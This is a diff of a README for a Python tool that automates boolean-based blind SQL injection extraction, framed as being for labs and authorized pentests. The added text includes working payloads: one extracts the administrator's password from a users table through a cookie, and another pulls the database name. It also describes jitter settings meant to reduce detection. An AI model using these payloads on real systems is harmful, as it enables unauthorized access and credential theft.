@@ -38,78 +38,67 @@ Key philosophy:
 
 ## ✨ Features
 
+* Config-driven blind SQLi automation framework
+* Cookie / Header / URL parameter injection support
 * Baseline response measurement
-* Time-based inference engine
+* Boolean-based inference engine
 * Character-by-character extraction
 * Traffic shaping & jitter
-* Evidence logging (JSON + text)
-* Proxy support (Burp Suite)
-* Config-driven behaviour
-* Safety-focused design
+* Evidence-driven workflow
+* Designed for labs and authorized testing environments
 
 ---
 
 ## 📦 Installation
-
-```bash
-# Clone the repository
+```
 git clone https://github.com/VikashChoudhary-04/safe-blind-sqli-inference-engine.git
-
-# Move into project folder
 cd safe-blind-sqli-inference-engine
 
-# Create virtual environment (recommended)
 python3 -m venv venv
 source venv/bin/activate
 
-# Install dependencies
 pip install -r requirements.txt
 ```
-
 ### Verify installation
-
-```bash
+```
 python3 -m blind_extractor.main
 ```
-
 ---
 
 ## 📁 Repository Structure
-
-```text
+```txt
 safe-blind-sqli-inference-engine/
 │
-├── blind_extractor/              # Main application package
-│   ├── __init__.py
-│   ├── main.py                   # Entry point / orchestrator
-│   ├── config_loader.py          # Loads YAML configuration
-│   ├── logger.py                 # Evidence & JSON logging system
-│   ├── request_engine.py         # HTTP communication & measurement
-│   ├── baseline.py               # Establishes normal response baseline
-│   ├── inference_engine.py       # TRUE/FALSE decision logic
-│   ├── extractor.py              # Character extraction engine
-│   ├── scheduler.py              # (v2 placeholder) scheduling system
-│   ├── checkpoint.py             # (v2 placeholder) resume capability
-│   └── oob_listener.py           # (v2 placeholder) OOB integration
+├── blind_extractor/
+│   ├── **init**.py
+│   ├── main.py
+│   ├── config_loader.py
+│   ├── logger.py
+│   ├── request_engine.py
+│   ├── baseline.py
+│   ├── inference_engine.py
+│   ├── extractor.py
+│   ├── scheduler.py      (future feature)
+│   ├── checkpoint.py     (future feature)
+│   └── oob_listener.py   (future feature)
 │
-├── config.yaml                   # Tool configuration
-├── requirements.txt              # Python dependencies
-├── LICENSE                       # MIT license
-└── README.md                     # Documentation
+├── config.yaml
+├── requirements.txt
+├── LICENSE
+└── README.md
 ```
-
 ---
 
 ## 🧠 When Should You Use This Tool?
 
-Use this tool **after** you have manually confirmed a blind SQL injection vulnerability.
+Use this tool **after manually confirming a blind SQL injection vulnerability.**
 
-This tool is **NOT a scanner**.
+This tool is **NOT a vulnerability scanner**.
 
 It is designed to:
 
 * Automate inference
-* Reduce manual repetition
+* Reduce repetitive testing
 * Collect reproducible evidence
 
 ---
@@ -117,126 +106,137 @@ It is designed to:
 ## ⚙️ Configuration
 
 All behaviour is controlled via **config.yaml**.
+Users adapt this file for their specific target.
+
+### Example configuration
+```
+target:
+  url: "https://target-lab-url/"
+
+injection:
+  type: "cookie"
+  name: "TrackingId"
+  base_value: ""
+
+inference:
+  true_string: "Welcome back!"
+
+extraction:
+  charset: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+  max_length: 25
+  query: "' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1)='{char}"
+```
+---
+
+## 🔍 Configuration Explanation
+
+### Injection settings
+
+| Field      | Meaning                                |
+| ---------- | -------------------------------------- |
+| type       | cookie / param / header                |
+| name       | vulnerable parameter / cookie / header |
+| base_value | normal value before payload            |
+
+Examples:
+
+Inject into URL parameter:
+`type: param`
+`name: id`
+
+Inject into header:
+`type: header`
+`name: User-Agent`
+
+Inject into cookie:
+`type: cookie`
+`name: session`
+
+---
+
+### TRUE detection
+
+The engine detects when a condition is TRUE using a response string.
 
 Example:
 
-```yaml
-target:
-  url: "https://lab.test/products"
-  injectable_param: "id"
-  base_value: "1"
-```
+`true_string: "Welcome back!"`
 
-### Field Explanation
+Change this depending on the target behaviour.
 
-| Field            | Description           |
-| ---------------- | --------------------- |
-| url              | Target endpoint       |
-| injectable_param | Vulnerable parameter  |
-| base_value       | Normal baseline value |
+---
+
+### Extraction query
+
+Defines the SQL condition tested for each character.
+
+Example:
+
+`query: "' AND SUBSTRING(database(),{pos},1)='{char}"`
+
+Users modify this depending on:
+
+* DB type
+* Data being extracted
+* Lab or engagement goals
 
 ---
 
 ## 🐢 Traffic Safety Settings
-
-```yaml
-traffic:
-  max_requests_per_minute: 30
-  jitter_min_ms: 200
-  jitter_max_ms: 800
 ```
-
+traffic:
+  jitter_min_ms: 100
+  jitter_max_ms: 400
+```
 These settings:
 
 * Slow down requests
 * Add randomness
+* Protect target stability
 * Reduce detection risk
-* Protect lab stability
 
 ---
 
 ## ▶️ Running the Tool
-
-```bash
+```
 python3 -m blind_extractor.main
 ```
-
 ---
 
-## 🔬 What Happens During Execution
+## 🔬 Execution Workflow
 
-### Phase 1 — Baseline Detection
+### Phase 1 — Baseline
 
-The tool learns normal response behaviour:
-
-* Average response time
-* Normal response size
-
-This prevents false positives.
-
----
+The tool learns normal response behaviour to avoid false positives.
 
 ### Phase 2 — Condition Testing
 
-The tool tests database conditions like:
+The tool tests database conditions such as:
 
-```
-Is the first character of the database name = 'a' ?
-```
+Is character N equal to X?
 
-It detects TRUE/FALSE using response timing.
-
----
+TRUE/FALSE is detected using response differences.
 
 ### Phase 3 — Character Extraction
 
 Example output:
-
 ```
 [+] Found: a
-[+] Found: ac
-[+] Found: acc
-Extraction complete: accounts
+[+] Found: ad
+[+] Found: adm
+Extraction complete: admin
 ```
-
----
-
-## 📊 Evidence Logging
-
-After execution:
-
-```
-logs/run.log   → Human readable log
-logs/run.json  → Machine readable evidence
-```
-
-Example JSON entry:
-
-```json
-{
-  "payload": "SUBSTRING(database(),1,1)='a'",
-  "time": 2.63,
-  "decision": true
-}
-```
-
-Logs are designed for:
-
-* Pentest reports
-* Reproducibility
-* Audit trails
-
 ---
 
 ## 🧪 Example Workflow
 
-Typical professional workflow:
+Typical professional usage:
 
-1. Confirm blind SQL injection manually.
-2. Configure vulnerable parameter.
-3. Run the tool.
-4. Extract minimal proof-of-impact.
-5. Use logs as report evidence.
+1. Confirm blind SQL injection manually
+2. Configure config.yaml for the target
+3. Run the tool
+4. Extract minimal proof-of-impact
+5. Use results in a pentest report
 
 ---
 
@@ -244,14 +244,13 @@ Typical professional workflow:
 
 If extraction returns empty:
 
-* Target may not be vulnerable
-* Payload may not match database type
-* Increase timeout or jitter values
+* Injection point may be wrong
+* TRUE detection string may be incorrect
+* SQL query may not match DB type
+* Increase timeout or jitter
 
 ---
 
 # 📜 License
 
 MIT License
-
----
